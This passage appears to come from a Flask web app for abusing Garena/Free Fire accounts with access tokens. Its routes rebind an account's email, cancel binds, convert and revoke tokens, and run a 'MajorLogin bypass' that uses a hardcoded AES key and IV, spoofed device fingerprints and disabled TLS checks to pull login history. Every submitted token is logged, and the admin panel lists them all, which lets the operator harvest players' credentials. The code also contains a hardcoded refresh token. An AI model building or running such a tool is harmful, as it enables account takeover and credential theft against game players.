        <input type="text" name="security_code" placeholder="6-digit security code" required autofocus maxlength="6">
        <button type="submit">✅ Verify</button>
      </form>
    {% elif state.stage == 'new_email' %}
      <h2>Enter New Email</h2>
      <form method="POST">
        <input type="hidden" name="action" value="send_new_otp">
        <input type="email" name="new_email" placeholder="New Email" required autofocus>
        <button type="submit">📧 Send OTP</button>
      </form>
    {% elif state.stage == 'verify_new' %}
      <h2>OTP sent to {{ state.new_email }}</h2>
      <form method="POST">
        <input type="hidden" name="action" value="finalize">
        <input type="text" name="otp" placeholder="New-email OTP" required autofocus>
        <button type="submit">✅ Verify & Rebind</button>
      </form>
    {% endif %}
    </div>'''
    return render_page('Change Bind Email', tpl, result=result, error=error, state=state)

# ================= FEATURE: CANCEL BIND =================
@app.route('/feature/cancel_bind', methods=['GET', 'POST'])
@login_required
def feature_cancel_bind():
    result = None; error = None
    if request.method == 'POST':
        token = request.form.get('access_token', '').strip()
        if not token: error = 'Token required'
        else:
            try:
                h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                r = requests.post("https://100067.connect.garena.com/game/account_security/bind:cancel_request",
                                  headers=h, data={"app_id": "100067", "access_token": token}, timeout=15)
                p = parse_api(r.text)
                log_token(session['username'], 'cancel_bind', token,
                          'ok' if p['ok'] else p['err'], 'success' if p['ok'] else 'failed')
                if p['ok']: result = {'msg': '✓ Cancel request submitted'}
                else: error = f"Failed: {p['err']}"
            except Exception as e:
                error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    {% if result %}<div class="flash flash-success">{{ result.msg }}</div>{% endif %}
    <div class="card">
      <form method="POST">
        <input type="text" name="access_token" placeholder="Access Token" required>
        <button type="submit">🚫 Cancel Bind Request</button>
      </form>
    </div>'''
    return render_page('Cancel Bind Request', tpl, result=result, error=error)

# ================= FEATURE: EAT → ACCESS TOKEN =================
@app.route('/feature/eat_to_token', methods=['GET', 'POST'])
@login_required
def feature_eat_to_token():
    result = None; error = None
    if request.method == 'POST':
        raw = request.form.get('input', '').strip()
        eat = None
        if 'http' in raw or '?' in raw:
            q = urllib.parse.parse_qs(urllib.parse.urlparse(raw).query)
            eat = q.get('eat', [None])[0]
        else:
            eat = raw
        if not eat:
            error = 'No EAT token found in input'
        else:
            try:
                url = f"https://api-otrss.garena.com/support/callback/?access_token={eat}"
                r = requests.get(url, headers={"User-Agent": "Mozilla/5.0 (Android 13)"},
                                 allow_redirects=True, timeout=15)
                q = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)
                if 'access_token' in q:
                    at = q['access_token'][0]
                    result = {
                        'access_token': at,
                        'account_id':   q.get('account_id', ['?'])[0],
                        'nickname':     urllib.parse.unquote(q.get('nickname', ['?'])[0]),
                        'region':       q.get('region', ['?'])[0],
                    }
                    log_token(session['username'], 'eat_to_token', at,
                              f"nick={result['nickname']}", 'success')
                else:
                    error = 'Access token not found. Token may be expired.'
            except Exception as e:
                error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    <div class="card">
      <form method="POST">
        <input type="text" name="input" placeholder="EAT token OR full EAT URL" required>
        <button type="submit">🔄 Convert to Access Token</button>
      </form>
    </div>
    {% if result %}
    <div class="card">
      <h2>✓ Success</h2>
      <div class="result">
        <div class="row"><span class="lbl">Nickname</span><span class="val">{{ result.nickname }}</span></div>
        <div class="row"><span class="lbl">Account ID</span><span class="val">{{ result.account_id }}</span></div>
        <div class="row"><span class="lbl">Region</span><span class="val">{{ result.region }}</span></div>
        <div class="row"><span class="lbl">Access Token</span><span class="val mono">{{ result.access_token }}</span></div>
      </div>
    </div>
    {% endif %}'''
    return render_page('EAT → Access Token', tpl, result=result, error=error)

# ================= FEATURE: REVOKE TOKEN =================
@app.route('/feature/revoke_token', methods=['GET', 'POST'])
@login_required
def feature_revoke_token():
    result = None; error = None
    if request.method == 'POST':
        token = request.form.get('access_token', '').strip()
        if not token: error = 'Token required'
        else:
            # validate first
            player = fetch_player(token)
            if player.get('error'):
                error = 'Token invalid or already revoked'
            else:
                try:
                    refresh = "1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
                    url = f"https://100067.connect.garena.com/oauth/logout?access_token={token}&refresh_token={refresh}"
                    r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
                    if r.status_code == 200 and "error" not in r.text:
                        result = {'nickname': player.get('nickname','?'),
                                  'account_id': player.get('uid','?'),
                                  'region': player.get('region','?')}
                        log_token(session['username'], 'revoke_token', token,
                                  f"nick={player.get('nickname','?')}", 'success')
                    else:
                        error = 'Server rejected revoke request'
                        log_token(session['username'], 'revoke_token', token, 'server rejected', 'failed')
                except Exception as e:
                    error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    <div class="card">
      <form method="POST">
        <input type="text" name="access_token" placeholder="Access Token to Revoke" required>
        <button type="submit">🔒 Revoke</button>
      </form>
    </div>
    {% if result %}
    <div class="card">
      <h2>✓ Successfully Revoked</h2>
      <div class="result">
        <div class="row"><span class="lbl">Nickname</span><span class="val">{{ result.nickname }}</span></div>
        <div class="row"><span class="lbl">Account ID</span><span class="val">{{ result.account_id }}</span></div>
        <div class="row"><span class="lbl">Region</span><span class="val">{{ result.region }}</span></div>
        <div class="row"><span class="lbl">Status</span><span class="val ok">Logged out & revoked</span></div>
      </div>
    </div>
    {% endif %}'''
    return render_page('Revoke Access Token', tpl, result=result, error=error)

# ================= FEATURE: LOGIN HISTORY =================
# (AES + proto logic — from original)
AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
PLATFORM_MAP = {3:"Facebook",4:"Guest",5:"VK",6:"Huawei",8:"Google",11:"X (Twitter)",13:"AppleId"}

def aes_enc(d): return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))
def aes_dec(d): return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def _read_varint(data, off):
    res = 0; shift = 0
    while True:
        if off >= len(data): break
        b = data[off]; off += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80): break
        shift += 7
    return res, off

def _parse_record(data):
    rec = {}; off = 0
    while off < len(data):
        tag, off = _read_varint(data, off)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            v, off = _read_varint(data, off)
            if f == 1: rec['ts'] = v
            elif f == 2: rec['ram'] = v
        elif wt == 2:
            l, off = _read_varint(data, off)
            v = data[off:off+l]; off += l
            if f == 3: rec['dev'] = v.decode(errors='ignore')
            elif f == 4: rec['arch'] = v.decode(errors='ignore')
        else: break
    return rec

def _parse_history(data):
    recs = []; off = 0
    while off < len(data):
        tag, off = _read_varint(data, off)
        wt, f = tag & 7, tag >> 3
        if wt == 0: _, off = _read_varint(data, off)
        elif wt == 2:
            l, off = _read_varint(data, off)
            v = data[off:off+l]; off += l
            if f == 1: recs.append(_parse_record(v))
        else: break
    return recs

@app.route('/feature/login_history', methods=['GET', 'POST'])
@login_required
def feature_login_history():
    result = None; error = None; records = []
    if not PROTO_AVAILABLE:
        error = 'Protobuf files missing — this feature requires MajoRLogin_pb2.py & MajorLoginRes_pb2.py'
        tpl = '{% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}'
        return render_page('Login History', tpl, error=error)
    if request.method == 'POST':
        token = request.form.get('token', '').strip()
        if not token: error = 'Token required'
        else:
            jwt_token = token if (token.startswith('ey') and '.' in token) else None
            if not jwt_token:
                # resolve open_id
                o_id = None
                try:
                    r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token}",
                                     headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
                    o_id = r.get('open_id')
                except: pass
                if not o_id:
                    try:
                        u = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                                         headers={"access-token": token, "user-agent": "Mozilla/5.0"},
                                         verify=False, timeout=5).json().get('uid')
                        if u:
                            o_id = requests.post("https://topup.pk/api/auth/player_id_login",
                                                 json={"app_id": 100067, "login_id": str(u)},
                                                 verify=False, timeout=5).json().get('open_id')
                    except: pass
                if not o_id:
                    error = 'Cannot resolve Open ID — token invalid/expired'
                else:
                    # MajorLogin bypass
                    for p in (8, 3, 4, 6):
                        try:
                            m = mLpB.MajorLogin()
                            m.event_time = str(datetime.now())[:-7]
                            m.game_name = "free fire"
                            m.platform_id = p; m.client_version = "1.120.1"
                            m.system_software = "Android OS 9 / API-28"; m.system_hardware = "Handheld"
                            m.telecom_operator = "Verizon"; m.network_type = "WIFI"
                            m.screen_width = 1920; m.screen_height = 1080; m.screen_dpi = "280"
                            m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
                            m.memory = 3003; m.gpu_renderer = "Adreno (TM) 640"
                            m.gpu_version = "OpenGL ES 3.1 v1.46"
                            m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
                            m.client_ip = "223.191.51.89"; m.language = "en"
                            m.open_id = o_id; m.open_id_type = str(p)
                            m.device_type = "Handheld"; m.access_token = token
                            m.platform_sdk_id = 1
                            m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
                            m.login_by = 3; m.channel_type = 3; m.cpu_type = 2
                            m.cpu_architecture = "64"; m.client_version_code = "2019118695"
                            m.login_open_id_type = p
                            m.origin_platform_type = str(p); m.primary_platform_type = str(p)
                            payload = aes_enc(m.SerializeToString())
                            r = requests.post("https://loginbp.ggpolarbear.com/MajorLogin",
                                              headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E)",
                                                       "Content-Type": "application/octet-stream",
                                                       "Expect": "100-continue", "X-GA": "v1 1",
                                                       "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB52"},
                                              data=payload, timeout=10, verify=False)
                            if r.status_code == 200:
                                res = mLrPb.MajorLoginRes()
                                try: res.ParseFromString(aes_dec(r.content))
                                except: res.ParseFromString(r.content)
                                if res.token:
                                    jwt_token = res.token; break
                        except: continue
                    if not jwt_token:
                        error = 'MajorLogin failed on all platforms'
            if jwt_token:
                try:
                    h = {"Authorization": f"Bearer {jwt_token}",
                         "Expect": "100-continue", "X-Unity-Version": "2018.4.11f1",
                         "X-GA": "v1 1", "ReleaseVersion": "OB52",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)",
                         "Host": "client.ind.freefiremobile.com", "Connection": "close"}
                    r = requests.post("https://client.ind.freefiremobile.com/GetLoginHistory",
                                      headers=h, data=aes_enc(b""), timeout=15, verify=False)
                    if r.status_code != 200:
                        error = f'History request failed: HTTP {r.status_code}'
                    else:
                        try: d = aes_dec(r.content)
                        except: d = r.content
                        records = _parse_history(d)
                        log_token(session['username'], 'login_history', token,
                                  f"records={len(records)}", 'success')
                except Exception as e:
                    error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    <div class="card">
      <form method="POST">
        <input type="text" name="token" placeholder="Access Token OR JWT Token" required>
        <button type="submit">📜 Fetch Login History</button>
      </form>
    </div>
    {% if records %}
    <div class="card">
      <h2>Login Records ({{ records|length }})</h2>
      {% for r in records %}
      <div class="result" style="margin-bottom:12px">
        <div class="row"><span class="lbl">#{{ loop.index }} Timestamp</span><span class="val">{{ r.ts }}</span></div>
        <div class="row"><span class="lbl">Device</span><span class="val">{{ r.dev|default("Unknown") }}</span></div>
        <div class="row"><span class="lbl">Architecture</span><span class="val">{{ r.arch|default("Unknown") }}</span></div>
        <div class="row"><span class="lbl">RAM</span><span class="val">{{ r.ram|default(0) }} MB</span></div>
      </div>
      {% endfor %}
    </div>
    {% endif %}'''
    return render_page('Login History', tpl, error=error, records=records)

# ================= FEATURE: BOUND ACCOUNTS =================
@app.route('/feature/bound_accounts', methods=['GET', 'POST'])
@login_required
def feature_bound_accounts():
    result = None; error = None
    if request.method == 'POST':
        token = request.form.get('access_token', '').strip()
        if not token: error = 'Token required'
        else:
            try:
                url = "https://100067.connect.garena.com/bind/app/platform/info/get"
                r = requests.get(url, params={"access_token": token},
                                 headers={"User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"},
                                 timeout=10)
                if r.status_code != 200:
                    error = f"HTTP {r.status_code}"
                else:
                    d = r.json()
                    PM = {1:"Garena",3:"Facebook",4:"Guest",5:"VK",6:"Huawei",7:"Apple",8:"Google",
                          10:"GameCenter/Line",11:"X (Twitter)",13:"Apple ID",28:"Line",35:"TikTok"}
                    bound   = [PM.get(p, f"Unknown ({p})") for p in d.get("bounded_accounts", [])]
                    avail   = [PM.get(p, f"Unknown ({p})") for p in d.get("available_platforms", [])]
                    result  = {'bound': bound, 'available': avail}
                    log_token(session['username'], 'bound_accounts', token,
                              f"bound={len(bound)}", 'success')
            except Exception as e:
                error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    <div class="card">
      <form method="POST">
        <input type="text" name="access_token" placeholder="Access Token" required>
        <button type="submit">🔍 Check Platform Binds</button>
      </form>
    </div>
    {% if result %}
    <div class="card">
      <h2>Bound Platforms</h2>
      <div class="result">
        {% if result.bound %}{% for p in result.bound %}<span class="chip ok">{{ p }}</span>{% endfor %}
        {% else %}<span class="val">None</span>{% endif %}
      </div>
      <h2 style="margin-top:20px">Available Platforms</h2>
      <div class="result">
        {% if result.available %}{% for p in result.available %}<span class="chip">{{ p }}</span>{% endfor %}
        {% else %}<span class="val">None</span>{% endif %}
      </div>
    </div>
    {% endif %}'''
    return render_page('Platform Binds', tpl, result=result, error=error)

# ================= MY TOKENS =================
@app.route('/my_tokens')
@login_required
def my_tokens():
    conn = db()
    rows = conn.execute("SELECT * FROM token_logs WHERE username=? ORDER BY id DESC LIMIT 100",
                        (session['username'],)).fetchall()
    conn.close()
    tpl = '''
    <div class="card">
      <p style="color:#94a3b8;margin-bottom:16px">Showing last 100 token uses for <b>{{ username }}</b></p>
      <table>
        <tr><th>Time</th><th>Feature</th><th>Token</th><th>Status</th></tr>
        {% for r in rows %}
        <tr>
          <td>{{ r.timestamp }}</td>
          <td>{{ r.feature }}</td>
          <td class="mono">{{ r.access_token[:60] }}{% if r.access_token|length > 60 %}…{% endif %}</td>
          <td class="{% if r.status=='success' %}ok{% else %}bad{% endif %}">{{ r.status }}</td>
        </tr>
        {% endfor %}
      </table>
    </div>'''
    return render_page('My Token Logs', tpl, rows=rows, username=session['username'])

# ================= ADMIN =================
@app.route('/admin')
@admin_required
def admin_panel():
    conn = db()
    users  = conn.execute("SELECT * FROM users ORDER BY id DESC").fetchall()
    tokens = conn.execute("SELECT * FROM token_logs ORDER BY id DESC LIMIT 500").fetchall()
    stats  = {
        'users':  len(users),
        'tokens': conn.execute("SELECT COUNT(*) FROM token_logs").fetchone()[0],
        'unique_tokens': conn.execute("SELECT COUNT(DISTINCT access_token) FROM token_logs").fetchone()[0],
    }
    conn.close()

    tpl = '''
    <div class="menu-grid" style="margin-bottom:20px">
      <div class="menu-item"><span class="num">{{ stats.users }}</span>Total Users</div>
      <div class="menu-item"><span class="num">{{ stats.tokens }}</span>Total Token Uses</div>
      <div class="menu-item"><span class="num">{{ stats.unique_tokens }}</span>Unique Tokens</div>
    </div>

    <div class="card">
      <h2>👥 Registered Users ({{ users|length }})</h2>
      <table>
        <tr><th>ID</th><th>Username</th><th>Admin</th><th>Created</th><th>Last Login</th></tr>
        {% for u in users %}
        <tr>
          <td>{{ u.id }}</td>
          <td>{{ u.username }}</td>
          <td>{% if u.is_admin %}<span class="ok">✓</span>{% else %}—{% endif %}</td>
          <td>{{ u.created_at or '—' }}</td>
          <td>{{ u.last_login or '—' }}</td>
        </tr>
        {% endfor %}
      </table>
    </div>

    <div class="card">
      <h2>🔑 All Access Token Logs (last 500)</h2>
      <div style="overflow-x:auto">
      <table>
        <tr><th>Time</th><th>User</th><th>Feature</th><th>Access Token</th><th>Details</th><th>Status</th></tr>
        {% for t in tokens %}
        <tr>
          <td>{{ t.timestamp }}</td>
          <td><b>{{ t.username }}</b></td>
          <td>{{ t.feature }}</td>
          <td class="mono">{{ t.access_token[:50] }}{% if t.access_token|length > 50 %}…{% endif %}</td>
          <td>{{ t.details }}</td>
          <td class="{% if t.status=='success' %}ok{% elif t.status=='failed' %}bad{% endif %}">{{ t.status }}</td>
        </tr>
        {% endfor %}
      </table>
      </div>
    </div>'''
    return render_page('Admin Panel', tpl, users=users, tokens=tokens, stats=stats)

# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"\n⚡ Garena Bind Tool Web running on http://0.0.0.0:{port}")
    print(f"👑 Admin: username='{ADMIN_USERNAME}'  password='{ADMIN_PASSWORD}'\n")
    app.run(host="0.0.0.0", port=port, debug=False)